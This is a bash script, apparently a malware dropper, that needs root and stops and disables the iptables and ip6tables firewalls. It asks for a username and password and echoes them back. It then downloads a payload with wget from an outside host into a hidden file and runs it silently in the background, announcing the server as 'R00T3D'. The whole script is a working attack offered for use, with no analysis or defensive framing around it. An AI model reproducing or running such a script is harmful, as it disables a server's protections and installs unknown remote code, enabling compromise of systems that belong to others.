#! /bin/bash
 
# Introduction
echo -e "\e[36mMade By Sanzu & Yuro\e[39m"
 
# Check user privilege
if [ $USER != 'root' ]
then
echo -e "\e[34mRequires Super User Dumb Fuck\e[39m"
exit 0
fi
 
# OS Checking
echo $VERSION
ARCH=$(uname -a)
echo -e "\e[97m[\e[91m $ARCH \e[97m]\e[39m"
 
# Kill Iptables | Ip6tables
service iptables stop
service ip6tables stop
chkconfig iptables off
chkconfig ip6tables off
echo -e "\e[91mSecurity Protocol Stopped | \e[37m50% \e[92mComplete!\e[39m"
 
# Input your Credentials
read -p "\e[36mInput your Username:\e[39m" USER
echo $USER
read -p "\e[36mInput your Password:\e[39m" PASSWORD
echo $PASSWORD
 
# Wget Payload
 
wget -q http://nerdkkk.tk/HjT5Rk -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1
echo -e "\e[91mServer Successfully R00T3D! | \e[37m100% \e[92mComplete!\e[39m"
